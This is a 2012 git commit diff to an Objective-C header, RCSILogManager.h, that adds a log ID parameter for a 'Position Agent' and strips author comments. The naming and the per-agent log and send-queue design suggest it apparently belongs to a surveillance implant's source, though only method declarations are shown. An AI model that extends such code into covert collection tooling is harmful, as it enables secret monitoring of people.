02d38c1a07bc916b2cf0212eedfcba11ca570503
armored <armored@SuperElbarto.local>
2012-07-20 16:19:17 +0200

    Support for Position Agent

--- Modules/RCSILogManager.h
+++ Modules/RCSILogManager.h
@@ -69,58 +69,28 @@ enum {
 - (void)release;
 - (id)autorelease;
 
-- (NSMutableArray*)getLogQueue: (u_int)agentID;
+- (NSMutableArray*)getLogQueue: (u_int)agentID andLogID:(u_int)logID;
 
 - (NSData *)createLogHeader: (u_int)agentID
                   timestamp: (int64_t)fileTime
                 agentHeader: (NSData *)anAgentHeader;
                  
-//
-// @author
-//  revenge
-// @abstract
-//  Main function used to create a log for the given agent.
-//  Accepts logID in order to allow (1 Agent -> n logs)
-//
+
 - (BOOL)createLog: (u_int)agentID
       agentHeader: (NSData *)anAgentHeader
         withLogID: (u_int)logID;
 
 - (BOOL)closeActiveLogsAndContinueLogging: (BOOL)continueLogging;
 
-//
-// @author
-//  revenge
-// @abstract
-//  Close a single active log and move it to the mSendQueue
-//
 - (BOOL)closeActiveLog: (u_int)agentID
              withLogID: (u_int)logID;
 
-//
-// @author
-//  revenge
-// @abstract
-//  Writes data to log referenced by anHandle
-//
 - (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle;
 
-//
-// @author
-//  revenge
-// @abstract
-//  Writes data to log referenced by agentID + logID
-//
 - (BOOL)writeDataToLog: (NSMutableData *)aData 
               forAgent: (u_int)agentID
              withLogID: (u_int)logID;
 
-//
-// @author
-//  revenge
-// @abstract
-//  Remove a single log from the mSendQueue
-//
 - (int)getSendLogItemCount;
 - (id)getSendLogItemAtIndex:(int)theIndex;
 
